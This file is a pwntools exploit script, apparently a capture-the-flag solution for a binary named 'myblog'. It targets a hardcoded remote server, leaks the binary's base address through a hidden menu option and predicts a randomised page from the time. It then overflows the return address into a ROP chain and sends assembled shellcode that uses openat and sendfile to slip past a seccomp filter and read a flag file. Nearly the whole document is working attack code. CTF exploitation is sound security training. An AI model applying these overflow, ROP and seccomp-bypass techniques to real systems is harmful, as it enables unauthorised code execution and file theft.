from pwn import *
import time
from subprocess import Popen, PIPE
# context.log_level = "DEBUG"

#Using secret mode 31337 we overflow the RIP, make it point to the start of the random page
#that we guessed using the local time
#we write a shellcode stub in the page that pivot the execution to a ROP-chain in the heap,
#which reads a bigger shellcode in the random page and then jumps to it
#the last shellcode bypass the seccomp filter using openat and sendfile

chal = ELF("myblog")
leak_off = 0xef4
main_off = 0x1058
after_init_off = 0x1071

pre_time = int(time.time())
# r = remote("localhost",4000)
r = remote("159.65.125.233",31337)
post_time = int(time.time())
mid_time =  (pre_time+post_time) / 2


raw_input("Attach?")

def getPage(t):
    process = Popen(["./get_page", str(t)], stdout=PIPE)
    (output, err) = process.communicate()
    exit_code = process.wait()
    return int(output,16)

page = getPage(mid_time)

log.info("Page Should be at = "+ hex(page))

#leak text
r.recvuntil("4. Exit\n")
r.sendline("31337")
r.recvuntil("you a gift ")
leak_run = int(r.recvline()[:-1],16)
base = leak_run - leak_off
log.info("Runtime Base = "+hex(base))
log.info("Runtime secret function = "+hex(leak_run))
r.send("awd\n")

#leak shellcode to ret to main
r.recvuntil("4. Exit\n")
r.sendline("3")
r.recvuntil("New Owner : \n")
# r.send("\xff\x64\x24\x38".ljust(7,"\x00"))
shellcode = [0xC9, 0x48, 0x83, 0xC5, 0x20, 0xC9, 0xC3]
shellcode = "".join(map(chr,shellcode))
r.send(shellcode.ljust(7,"\x00"))


#leak text
r.recvuntil("4. Exit\n")
r.sendline("1")
r.recvuntil("\n")
#5 gadget di ropchain HERE
rop = p64(page+0x100)#fuffa
rop += p64(base + 0x0000000000001171) # : pop rsi ; pop r15 ; ret
rop += p64(page+0x108)
rop += p64(0xdeadbeef)
rop += p64(base + 0xCF2) #read
rop += p64(base + main_off) #not executed
r.send(rop.ljust(48,"\x00")[:47])
r.recvuntil("\n")
r.sendline("Fuffa")

#jump to page
r.recvuntil("4. Exit\n")
r.sendline("31337")
r.recvuntil("you a gift ")
r.recvline()
log.info("Runtime Base = "+hex(base))
log.info("Runtime secret function = "+hex(leak_run))
pre_time = int(time.time())
r.send(p64(page)+p64(page+8)+p64(page))
post_time = int(time.time())
mid_time =  (pre_time+post_time) / 2
new_page = getPage(mid_time)
log.info("New page Should be at = "+ hex(new_page))

raw_input("Sending stage 2")

shellcode =  """mov rax, 257
                mov rdi, -100
                mov rsi, {}
                xor rdx, rdx
                syscall
                mov rsi, rax
                mov rax, 40
                mov rdi, 1
                xor rdx, rdx
                mov r10, 100
                syscall
                """.format(hex(page+0x110+0x500))
assembled = asm(shellcode,arch = 'amd64', os = 'linux')
r.sendline(p64(page+0x110)+assembled.ljust(0x500,"\x00")+"/home/pwn/flag\x00")#the path was trial and error, but in the end I assumed it was the same that for "cat"


r.interactive()
